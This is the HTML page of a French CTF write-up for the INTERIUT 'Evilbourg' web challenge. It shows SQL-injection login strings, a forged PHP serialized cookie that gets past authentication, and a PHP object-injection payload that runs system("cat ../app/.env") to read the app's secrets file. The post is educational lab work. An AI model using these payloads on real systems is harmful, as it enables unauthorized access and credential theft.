@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+
+<meta itemprop="name" content="INTERIUT - WEB : Evilbourg">
+<meta itemprop="description" content="Le CTF INTERIUT se déroule à l&rsquo;ENSIBS en juin, il est réservé aux niveaux DUT / BTS. Le challenge Evilbourg se déroule en 3 parties, crescendo.
+TL;DR Modification de cookie pour bypasser une authentification, suivi d&rsquo;une injection d&rsquo;objet PHP serializé pour executer des commandes systèmes.
+Ce chall et writeup ont été fait avec Cabir.
+Partie 1 : Nous arrivons sur l&rsquo;interface du challenge. 
+Premier reflexe pour ma part je vais dans l&rsquo;onglet connexion.">
+
+
+<meta itemprop="datePublished" content="2019-06-05T10:06:59&#43;02:00" />
+<meta itemprop="dateModified" content="2019-06-05T10:06:59&#43;02:00" />
+<meta itemprop="wordCount" content="817">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta property="og:title" content="INTERIUT - WEB : Evilbourg" />
+<meta property="og:description" content="Le CTF INTERIUT se déroule à l&rsquo;ENSIBS en juin, il est réservé aux niveaux DUT / BTS. Le challenge Evilbourg se déroule en 3 parties, crescendo.
+TL;DR Modification de cookie pour bypasser une authentification, suivi d&rsquo;une injection d&rsquo;objet PHP serializé pour executer des commandes systèmes.
+Ce chall et writeup ont été fait avec Cabir.
+Partie 1 : Nous arrivons sur l&rsquo;interface du challenge. 
+Premier reflexe pour ma part je vais dans l&rsquo;onglet connexion." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://deilyora.github.io/posts/evilbourg/" /><meta property="article:published_time" content="2019-06-05T10:06:59&#43;02:00"/>
+<meta property="article:modified_time" content="2019-06-05T10:06:59&#43;02:00"/><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="INTERIUT - WEB : Evilbourg"/>
+<meta name="twitter:description" content="Le CTF INTERIUT se déroule à l&rsquo;ENSIBS en juin, il est réservé aux niveaux DUT / BTS. Le challenge Evilbourg se déroule en 3 parties, crescendo.
+TL;DR Modification de cookie pour bypasser une authentification, suivi d&rsquo;une injection d&rsquo;objet PHP serializé pour executer des commandes systèmes.
+Ce chall et writeup ont été fait avec Cabir.
+Partie 1 : Nous arrivons sur l&rsquo;interface du challenge. 
+Premier reflexe pour ma part je vais dans l&rsquo;onglet connexion."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>INTERIUT - WEB : Evilbourg</title>
+	<link rel="stylesheet" href="https://deilyora.github.io/css/style.min.e81f50049998463da8cdbf0f848b77d9797f27f249581a236a3161d386f310db.css" integrity="sha256-6B9QBJmYRj2ozb8PhIt32Xl/J/JJWBojajFh04bzENs=">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp faster">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://deilyora.github.io">Deilyora</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					<a href="https://deilyora.github.io/posts/">Posts</a>
+					<a href="https://deilyora.github.io/about-hugo/">About</a>
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/aCabillic_" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://github.com/" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="https://twitter.com/SaladTomat0nion" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://deilyora.github.io/posts/">Posts</a></li>
+			<li><a href="https://deilyora.github.io/about-hugo/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Jun 5, 2019</span></div>
+				<h1>INTERIUT - WEB : Evilbourg</h1>
+			</header>
+			<div class="content">
+				
+
+<p>Le CTF INTERIUT se déroule à l&rsquo;ENSIBS en juin, il est réservé aux niveaux DUT / BTS.
+Le challenge Evilbourg se déroule en 3 parties, <strong>crescendo</strong>.</p>
+
+<h2 id="span-style-color-3cb371-tl-dr-span"><span style="color:#3cb371;">TL;DR</span><a href="#span-style-color-3cb371-tl-dr-span" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>Modification de cookie pour bypasser une authentification, suivi d&rsquo;une injection d&rsquo;objet PHP serializé
+pour executer des commandes systèmes.</p>
+
+<p>Ce chall et writeup ont été fait avec <a href="https://cabir.fr" target="_blank">Cabir</a>.</p>
+
+<h2 id="span-style-color-3cb371-partie-1-span"><span style="color:#3cb371;">Partie 1 :</span><a href="#span-style-color-3cb371-partie-1-span" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>Nous arrivons sur l&rsquo;interface du challenge.
+<center><img src="/img/writeups/evilbourg/accueil.png" alt="accueil" /></center></p>
+
+<p>Premier reflexe pour ma part je vais dans l&rsquo;onglet connexion.
+<center><img src="/img/writeups/e    vilbourg/connexion.png" alt="connexion" /></center></p>
+
+<p>On essaye rapidement un payload extremement compliqué :</p>
+
+<pre><code>admin' OR 1=1--
+ou
+admin' OR 1=1#
+</code></pre>
+
+<p>Rien ne ce passe, il n&rsquo;y a pas de réaction de la part du serveur.</p>
+
+<p>On décide d&rsquo;aller voir les cookies <a href="https://addons.mozilla.org/de/firefox/addon/a-cookie-manager/" target="_blank">(avec l&rsquo;extension CookieManager sur Firefox)</a>.</p>
+
+<p>On le décode avec <a href="https://www.urlencoder.org/" target="_blank">URL DECODE</a> :</p>
+
+<pre><code>a:2:{s:11:&quot;Utilisateur&quot;;i:0;s:10:&quot;slim.flash&quot;;a:0:{}}
+</code></pre>
+
+<p>On remarque que Utilisateur a un attribut integer : <code>i:0</code>.
+On le passe à <code>i:1</code>, et on rafraichit la page.</p>
+
+<p>On URL encode le cookie pour pouvoir l&rsquo;insérer avec <a href="https://www.urlencoder.org/" target="_blank">URL ENCODE</a> :</p>
+
+<pre><code>a%3A2%3A%7Bs%3A11%3A%22Utilisateur%22%3Bi%3A0%3Bs%3A10%3A%22slim.flash%22%3Ba%3A0%3A%7B%7D%7D
+</code></pre>
+
+<p>On rafraichit la page, nous sommes connectés.
+<center><img src="/img/writeups/evilbourg/logged.png" alt="logged" /></center></p>
+
+<p>On a accès à un Gitlab sur lequel on trouve dans le README.md :
+<center><img src="/img/writeups/evilbourg/flag1.png" alt="firstflag" /></center></p>
+
+<p><center><code>FLAG IS : H2G2{N0_S4F3_T0ken}</code></center></p>
+
+<h2 id="span-style-color-3cb371-partie-2-span"><span style="color:#3cb371;">Partie 2 :</span><a href="#span-style-color-3cb371-partie-2-span" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>On obtient un acces à un Gitlab. On cherche le fichier <code>.env</code>.
+A l&rsquo;intérieur on trouve deux identifiants :
+<center><img src="/img/writeups/evilbourg/identifiant.png" alt="identifiant" /></center>
+Mais rien de ce côté là.</p>
+
+<p>Dans le dossier var, ont trouve des fichiers de logs.
+Dans les erreurs, il y a un appel a un fichier qui attire notre attention : <strong>Confidential.php.</strong></p>
+
+<pre><code>&lt;?php
+
+namespace App\Controller;
+
+
+use App\Service\EnvService;
+use App\Service\SystemCall;
+use App\Service\UserRankService;
+
+class Confidential
+{
+    public function confidential($app)
+    {
+        $userRankService = new UserRankService();
+        $rank = $userRankService-&gt;getSessionRank();
+
+        $envService = new EnvService();
+
+        $deuxiemeFlag = $envService-&gt;getEnv('DEUXIEME_FLAG');
+        $notesHacker = $envService-&gt;getEnv('NOTES_HACKER');
+        $systemCall = new SystemCall('system(&quot;ls -a ../app&quot;);');
+
+        if($rank === UserRankService::ADMIN_RANK){
+            $app-&gt;render('front/confidential.twig', array('admin' =&gt; $rank, 'systemCall' =&gt; $systemCall,
+                'deuxiemeFlag' =&gt; $deuxiemeFlag, 'notesHacker' =&gt; $notesHacker));
+        }else {
+            $app-&gt;redirect('/connexion', '/connexion', 301);
+        }
+
+    }
+}
+</code></pre>
+
+<p>Dans le controller Confidential.php, on remarque un appel à : <code>if($rank === UserRankService::ADMIN_RANK)</code>
+Consultons le controller <code>UserRankService.php</code></p>
+
+<pre><code>&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: MATASSE
+ * Date: 23/02/2019
+ * Time: 13:22
+ */
+
+namespace App\Service;
+
+
+class UserRankService
+{
+
+    public const ADMIN_RANK = '4dmin_H3Re!';
+    public const ADMIN_TEXT= 'here you are!';
+    public const USER_RANK= 'Utilisateur';
+    public const USER_TEXT= 1;
+
+    function getSessionRank(){
+
+        if(isset($_SESSION[UserRankService::ADMIN_RANK])){
+            if($_SESSION[UserRankService::ADMIN_RANK] === UserRankService::ADMIN_TEXT){
+                return UserRankService::ADMIN_RANK;
+            }
+        }
+
+        if(isset($_SESSION[UserRankService::USER_RANK])){
+            if($_SESSION[UserRankService::USER_RANK] === UserRankService::USER_TEXT){
+                return UserRankService::USER_RANK;
+            }
+        }
+
+        return 'Non connecté';
+
+    }
+
+}
+
+</code></pre>
+
+<p>On reconnait notre ancien cookie avec l&rsquo;object serializé : <code>Utilisateur et 1</code>.
+Du coup on modifie le cookie en ajoutant <code>4dmin_H3Re et here you are!</code> (d&rsquo;après la condition if précedente).
+Ce qui ressemble à ca :</p>
+
+<pre><code>a:3:{s:11:&quot;4dmin_H3Re!&quot;;s:13:&quot;here you are!&quot;;s:11:&quot;Utilisateur&quot;;i:1;s:10:&quot;slim.flash&quot;;a:0:{}}
+</code></pre>
+
+<p>On <a href="https://www.urlencoder.org/" target="_blank">URL ENCODE</a> le cookie pour pouvoir l&rsquo;insérer</p>
+
+<pre><code>a%3A3%3A%7Bs%3A11%3A%224dmin_H3Re%21%22%3Bs%3A13%3A%22here%20you%20are%21%22%3Bs%3A11%3A%22Utilisateur%22%3Bi%3A1%3Bs%3A10%3A%22slim.flash%22%3Ba%3A0%3A%7B%7D%7D
+</code></pre>
+
+<p>Modification de cookie et :</p>
+
+<p><center><img src="/img/writeups/evilbourg/flag2.png" alt="flag2" /></center></p>
+
+<p><center><code>FLAG IS : H2G2{Publ1c_G1t_15_B4D}</code></center></p>
+
+<h2 id="span-style-color-3cb371-partie-3-span"><span style="color:#3cb371;">Partie 3 :</span><a href="#span-style-color-3cb371-partie-3-span" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>Dans les notes laissées par le hacker, il nous est indiqué que le site est vulnéralble à la CVE-2015-2171, mais qu&rsquo;il n&rsquo;y a pas de POC en ligne.
+Il est également précisé que la documentation OWASP sera très utile.</p>
+
+<p>On cherche donc des informations sur la CVE, et en effet on ne trouve rien de concret, à part le type de vulnérabilité (PHP Object Injection) et un lien vers le site d&rsquo;<a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank">OWASP</a> sur la vulnérabilité.</p>
+
+<p>L&rsquo;exploitation de la vulnérabilité consiste enfaite a injecter un objet PHP grâce à la méthode magique (qui est exploitable) <code>__wakeup()</code>.</p>
+
+<p>Après les notes du hacker, on pouvait voir sur la page le retour d&rsquo;un <code>ls</code>. En regardant le code source de Confidential.php, on voit en effet l&rsquo;appel à une classe SystemCall, avec en paramètre du constructeur un appel à la méthode <code>system</code> de PHP pour exécuter le <code>ls</code>.</p>
+
+<pre><code>&lt;?php
+
+namespace App\Controller;
+
+
+use App\Service\EnvService;
+use App\Service\SystemCall;
+use App\Service\UserRankService;
+
+class Confidential
+{
+    public function confidential($app)
+    {
+        $userRankService = new UserRankService();
+        $rank = $userRankService-&gt;getSessionRank();
+
+        $envService = new EnvService();
+
+        $deuxiemeFlag = $envService-&gt;getEnv('DEUXIEME_FLAG');
+        $notesHacker = $envService-&gt;getEnv('NOTES_HACKER');
+        $systemCall = new SystemCall('system(&quot;ls -a ../app&quot;);');
+
+        if($rank === UserRankService::ADMIN_RANK){
+            $app-&gt;render('front/confidential.twig', array('admin' =&gt; $rank, 'systemCall' =&gt; $systemCall,
+                'deuxiemeFlag' =&gt; $deuxiemeFlag, 'notesHacker' =&gt; $notesHacker));
+        }else {
+            $app-&gt;redirect('/connexion', '/connexion', 301);
+        }
+
+    }
+}
+</code></pre>
+
+<p>On se dit donc qu&rsquo;il va falloir injecter un objet de type <code>SystemCall</code>, afin de pouvoir passer nos propres commandes.</p>
+
+<p>Et ça tombe bien, on a justement le code source de la classe <code>SystemCall</code> sur le Gitlab.</p>
+
+<p>Pour sérialiser notre objet nous avons utilisé <a href="http://sandbox.onlinephpfunctions.com/" target="_blank">PHP Sandbox</a>.
+On y insère notre classe SystemCall à sérialiser pour pouvoir lire le fichier <code>.env</code> ainsi que un print(serialize()) pour sérialiser notre objet :</p>
+
+<pre><code>&lt;?php
+
+namespace App\Service;
+
+class SystemCall
+{
+    public $hook;
+    public $result;
+
+    function construct($hook)
+    {
+        $this-&gt;hook = $hook;
+    }
+
+    function wakeup()
+    {
+        $this-&gt;result = eval($this-&gt;hook);
+    }
+
+    function call()
+    {
+        $this-&gt;__wakeup();
+    }
+}
+
+print serialize(new SystemCall('system(&quot;cat ../app/.env&quot;)')).&quot;\n&quot;;
+print &quot;---------------------------------------------\n&quot;;
+print urlencode(serialize(new SystemCall('system(&quot;cat ../app/.env&quot;)')));
+?&gt;
+</code></pre>
+
+<p>On récupère donc notre objet sérialisé, de cette forme ( on oublie pas le <code>;</code> pour les méthodes PHP :D ) car sinon :
+<center><img src="/img/writeups/evilbourg/errorflag3.png" alt="errorflag3" /></center></p>
+
+<pre><code>O:22:&quot;App\Service\SystemCall&quot;:2:{s:4:&quot;hook&quot;;s:26:&quot;system(&quot;cat ../app/.env&quot;);&quot;;s:6:&quot;result&quot;;N;}
+</code></pre>
+
+<p>Il ne reste plus qu&rsquo;à injecter l&rsquo;objet. Il sera injecté au moment de la désérialisation. On le rajoute donc devant notre cookie d&rsquo;authentification, on encode et
+on récupére le <code>.env</code> de production :</p>
+
+<p><center><img src="/img/writeups/evilbourg/flag3.png" alt="flag3" /></center></p>
+
+<p><center><code>FLAG IS : H2G2{5L1M_15_Th3_W4Y}</code></center></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>817 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-06-05 10:06 &#43;0200</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2019 <a href="https://deilyora.github.io">Deilyora</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://deilyora.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+	<script src="https://deilyora.github.io/js/main.min.784417f5847151f848c339cf0acb13a06cbb648b1483435a28ed4556c4ead69b.js" integrity="sha256-eEQX9YRxUfhIwznPCssToGy7ZIsUg0NaKO1FVsTq1ps="></script>
+
+</body>
+
+</html>
